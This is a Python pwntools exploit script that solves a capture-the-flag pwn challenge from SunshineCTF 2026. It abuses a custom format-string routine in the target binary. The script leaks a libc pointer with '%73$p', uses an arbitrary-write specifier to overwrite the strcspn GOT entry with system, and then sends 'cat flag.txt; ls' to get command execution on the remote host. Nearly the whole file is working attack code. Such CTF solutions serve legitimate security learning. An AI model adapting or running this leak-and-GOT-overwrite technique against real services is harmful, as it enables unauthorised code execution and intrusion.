#!/usr/bin/env python3
"""Print Print Revolution / SunshineCTF 2026 - custom format string exploit.

The binary reads a "score card template" and renders it with a hand-written
printf-like function. Supported specifiers:
    %N$p  print argument N as hex
    %N$s  print string at argument N
    %N$w  *arg[N] = arg[N+1]   (8-byte arbitrary write)

Argument mapping (verified):  arg[6+i] == buffer[i*8]

No canary, no PIE, NX on, Partial RELRO. `system` is not imported, so we
overwrite a GOT entry (strcspn) with the libc `system` address, then submit a
line; main() calls strcspn(input) which now is system(input).

Requires the challenge-provided libc (glibc 2.39). Offsets used:
    leak (arg[73]) = libc + 0x2a1ca
    system          = libc + 0x58740
"""
import re
from pwn import *  # noqa

context.arch = "amd64"
context.log_level = "info"

HOST = "<CHALLENGE-HOST>"  # challenge instance (closed after the event)
PORT = 26002

STRCSPN_GOT = 0x404010   # strcspn@got, called by main() on every input line
LIBC_LEAK_OFF = 0x2A1CA  # arg[73] leaks libc + 0x2a1ca
LIBC_SYSTEM = 0x58740


def main() -> int:
    r = remote(HOST, PORT)

    # --- line 1: leak a libc pointer (arg[73]) ---
    r.recvuntil(b"score> ")
    r.sendline(b"%73$p")
    line = r.recvuntil(b"score> ", timeout=5)
    leak = int(re.search(rb"0x[0-9a-f]+", line).group(0), 16)
    libc = leak - LIBC_LEAK_OFF
    system = libc + LIBC_SYSTEM
    log.success(f"leak={leak:#x} libc={libc:#x} system={system:#x}")

    # --- line 2: %12$w writes *arg[12] = arg[13]
    #             arg[12] = buffer[48] -> 0x404010 (strcspn@got)
    #             arg[13] = buffer[56] -> system
    # Padding keeps the format spec at the start so the parser reaches %12$w
    # before hitting the nulls inside the addresses.
    buf = b"%12$w" + b"A" * (48 - 5) + p64(STRCSPN_GOT) + p64(system)
    r.sendline(buf)
    r.recvuntil(b"score> ", timeout=5)

    # --- line 3: main() calls strcspn(input) == system(input) ---
    r.sendline(b"cat flag.txt; ls")
    out = r.recvall(timeout=5)
    print(out.decode(errors="replace"))

    m = re.search(rb"sun\{[^}]*\}", out)
    if m:
        print("[+] flag:", m.group(0).decode())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())